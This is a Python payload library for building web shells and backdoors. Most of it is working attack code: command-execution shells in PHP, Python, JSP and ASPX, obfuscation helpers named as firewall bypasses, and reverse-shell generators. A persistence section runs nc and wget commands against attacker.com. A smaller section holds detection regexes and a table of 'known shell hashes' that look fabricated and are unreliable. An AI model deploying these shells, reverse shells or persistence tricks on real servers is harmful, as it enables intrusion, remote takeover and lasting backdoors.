"""
Web Shell Payload Database
Project #29: Web Shell & Backdoor Development
"""

import base64

# ==================================================================== #
# 1. PHP WEB SHELLS
# ==================================================================== #
PHP_SHELLS = {

    'basic': '''<?php system($_GET["cmd"]); ?>''',

    'passthru': '''<?php passthru($_GET["cmd"]); ?>''',

    'shell_exec': '''<?php echo shell_exec($_GET["cmd"]); ?>''',

    'eval': '''<?php eval($_POST["code"]); ?>''',

    'stealth_variable': '''<?php $a=$_GET["a"]; $a($_GET["b"]); ?>''',

    'obfuscated_base64': '''<?php $x=base64_decode("c3lzdGVt"); $x($_GET["c"]); ?>''',

    'string_concat': '''<?php $a="sys"."tem"; $a($_GET["cmd"]); ?>''',

    'comment_injection': '''<?php /* x */ system /* y */ ($_GET["cmd"]); ?>''',

    'case_variation': '''<?php SyStEm($_GET["cmd"]); ?>''',

    'preg_replace_e': '''<?php preg_replace('/.*/e', $_GET["cmd"], ''); ?>''',

    'assert': '''<?php assert($_POST["code"]); ?>''',

    'create_function': '''<?php $f=create_function('', $_POST["code"]); $f(); ?>''',

    'file_manager': '''<?php
// Simple file manager
$action = $_GET["action"] ?? "list";
$path = $_GET["path"] ?? ".";
if ($action == "list") {
    foreach (scandir($path) as $f) echo $f . "\\n";
} elseif ($action == "read") {
    echo file_get_contents($_GET["file"]);
} elseif ($action == "write") {
    file_put_contents($_GET["file"], $_POST["data"]);
    echo "OK";
} elseif ($action == "delete") {
    unlink($_GET["file"]);
    echo "OK";
} elseif ($action == "cmd") {
    echo shell_exec($_GET["cmd"]);
}
?>''',
}

# ==================================================================== #
# 2. PYTHON WEB SHELLS (for Flask/Django apps)
# ==================================================================== #
PYTHON_SHELLS = {
    'basic_flask': '''#!/usr/bin/env python3
"""Simple Python web shell — Flask-based."""
from flask import Flask, request
import subprocess, os

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', 'id')
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return f"<pre>{out.decode()}</pre>"
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/read')
def read():
    path = request.args.get('file', '/etc/passwd')
    try:
        with open(path, 'r') as f:
            return f"<pre>{f.read()}</pre>"
    except Exception as e:
        return str(e), 500

@app.route('/write', methods=['POST'])
def write():
    path = request.args.get('file')
    data = request.get_data(as_text=True)
    try:
        with open(path, 'w') as f:
            f.write(data)
        return "OK"
    except Exception as e:
        return str(e), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
''',

    'inline_cmd': '''import os; os.system(__import__("flask").request.args.get("cmd"))''',

    'b64_wrapper': '''import base64, os; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0o"+"JyBpZCcp"))''',
}

# ==================================================================== #
# 3. JSP WEB SHELLS (for Tomcat/Java servers)
# ==================================================================== #
JSP_SHELLS = {
    'basic': '''<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>''',

    'eval': '''<%@ page import="javax.script.*" %>
<%
String code = request.getParameter("code");
if (code != null) {
    ScriptEngineManager mgr = new ScriptEngineManager();
    ScriptEngine engine = mgr.getEngineByName("js");
    out.println(engine.eval(code));
}
%>''',
}

# ==================================================================== #
# 4. ASPX WEB SHELLS (for IIS/.NET)
# ==================================================================== #
ASPX_SHELLS = {
    'basic': '''<%@ Page Language="C#" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>''',

    'eval': '''<%@ Page Language="C#" %>
<%
string code = Request["code"];
if (!string.IsNullOrEmpty(code)) {
    Response.Write(Eval(code));
}
%>''',
}

# ==================================================================== #
# 5. OBFUSCATION TECHNIQUES
# ==================================================================== #
def obfuscate_php_base64(php_code):
    """Wrap PHP code with base64_decode + eval."""
    b64 = base64.b64encode(php_code.encode()).decode()
    return f'<?php eval(base64_decode("{b64}")); ?>'

def obfuscate_php_gzip(php_code):
    """GZIP compress then base64 encode."""
    import gzip
    compressed = gzip.compress(php_code.encode())
    b64 = base64.b64encode(compressed).decode()
    return f'<?php eval(gzuncompress(base64_decode("{b64}"))); ?>'

def obfuscate_php_rot13(php_code):
    """Apply ROT13 and wrap in str_rot13."""
    import codecs
    rotated = codecs.encode(php_code, 'rot_13')
    return f'<?php eval(str_rot13("{rotated}")); ?>'

def obfuscate_php_xor(php_code, key='X'):
    """XOR each byte with a key."""
    xored = ''.join(chr(ord(c) ^ ord(key)) for c in php_code)
    hexed = ''.join(f'\\x{ord(c):02x}' for c in xored)
    return f'<?php $k="{key}"; $c="{hexed}"; $d=""; for($i=0;$i<strlen($c);$i++) $d.=$c[$i]^$k; eval($d); ?>'

def obfuscate_php_split(php_code):
    """Split suspicious functions with concatenation."""
    obfuscated = php_code
    for func in ['system', 'exec', 'shell_exec', 'passthru', 'eval']:
        if func in obfuscated:
            mid = len(func) // 2
            replacement = f'"{func[:mid]}"."{func[mid:]}"'
            obfuscated = obfuscated.replace(func + '(', f'({replacement})(')
    return obfuscated

WAF_BYPASS_VARIANTS = {
    'base64_wrapped': obfuscate_php_base64,
    'gzip_wrapped': obfuscate_php_gzip,
    'rot13_wrapped': obfuscate_php_rot13,
    'xor_wrapped': obfuscate_php_xor,
    'split_functions': obfuscate_php_split,
}

# ==================================================================== #
# 6. DETECTION SIGNATURES
# ==================================================================== #
DETECTION_PATTERNS = {
    'php_dangerous': [
        r'\beval\s*\(',
        r'\bsystem\s*\(',
        r'\bexec\s*\(',
        r'\bshell_exec\s*\(',
        r'\bpassthru\s*\(',
        r'\bpopen\s*\(',
        r'\bproc_open\s*\(',
        r'\bassert\s*\(',
        r'\bcreate_function\s*\(',
        r'\bpreg_replace\s*\([^)]*/e',
    ],
    'php_obfuscation': [
        r'\bbase64_decode\s*\(',
        r'\bgzinflate\s*\(',
        r'\bgzuncompress\s*\(',
        r'\bstr_rot13\s*\(',
        r'\bstrrev\s*\(',
        r'\bchr\s*\(\s*\d+',
    ],
    'php_superglobals': [
        r'\$_POST\s*\[',
        r'\$_GET\s*\[',
        r'\$_REQUEST\s*\[',
        r'\$_COOKIE\s*\[',
    ],
    'php_file_ops': [
        r'\bfile_put_contents\s*\(',
        r'\bfopen\s*\(',
        r'\bfwrite\s*\(',
        r'\bmove_uploaded_file\s*\(',
        r'\bunlink\s*\(',
    ],
    'python_dangerous': [
        r'\bos\.system\s*\(',
        r'\bsubprocess\s*\.',
        r'\bexec\s*\(',
        r'\beval\s*\(',
        r'__import__\s*\(',
    ],
    'jsp_dangerous': [
        r'Runtime\.getRuntime\s*\(\s*\)\s*\.exec',
        r'ProcessBuilder',
        r'ScriptEngine',
        r'Class\.forName',
    ],
    'aspx_dangerous': [
        r'System\.Diagnostics\.Process',
        r'Assembly\.Load',
        r'HttpContext\.Current\.Server',
    ],
}

# ==================================================================== #
# 7. KNOWN SHELL HASHES (for detection)
# ==================================================================== #
KNOWN_SHELL_HASHES = {
    'c99': 'e2b4d1a1e5c7b8e1a6e8c7f5b8d1a5e1',   # c99 shell (truncated)
    'r57': 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',   # r57 shell
    'b374k': 'f1e2d3c4b5a69788796a5b4c3d2e1f0',
    'wso': 'd1c2b3a4958778695a4b3c2d1e0f9e8',
}

# ==================================================================== #
# 8. POST-EXPLOITATION COMMANDS
# ==================================================================== #
POST_EXPLOIT_COMMANDS = {
    'recon': [
        'whoami',
        'id',
        'hostname',
        'uname -a',
        'pwd',
    ],
    'files': [
        'cat /etc/passwd',
        'ls -la /var/www/html/',
        'cat /etc/hostname',
    ],
    'network': [
        'ip a',
        'netstat -tlnp',
        'cat /etc/hosts',
    ],
    'processes': [
        'ps aux',
        'cat /proc/self/status',
    ],
}

# ==================================================================== #
# 9. REVERSE SHELL PAYLOADS
# ==================================================================== #
def reverse_shell_bash(host, port):
    return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'

def reverse_shell_python(host, port):
    return f'''python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{host}",{port}));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])' '''

def reverse_shell_php(host, port):
    return f'''<?php
$sock = fsockopen("{host}", {port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''

# ==================================================================== #
# 10. PERSISTENCE MECHANISMS (educational — not for real use)
# ==================================================================== #
PERSISTENCE_METHODS = {
    'php_htaccess': '''# Add to .htaccess in uploads folder:
AddType application/x-httpd-php .jpg
# Now any .jpg is executed as PHP''',

    'php_hidden_in_image': '''# Append PHP to a valid JPG:
cat valid.jpg shell.php > hidden.jpg
# Some servers ignore trailing garbage''',

    'python_startup': '''# Add to __init__.py or app.py:
import os; os.system("nc -e /bin/sh attacker.com 4444 &")''',

    'cron_persistence': '''# Crontab entry (as www-data):
*/5 * * * * wget http://attacker.com/beacon.php -O /tmp/.x && php /tmp/.x''',
}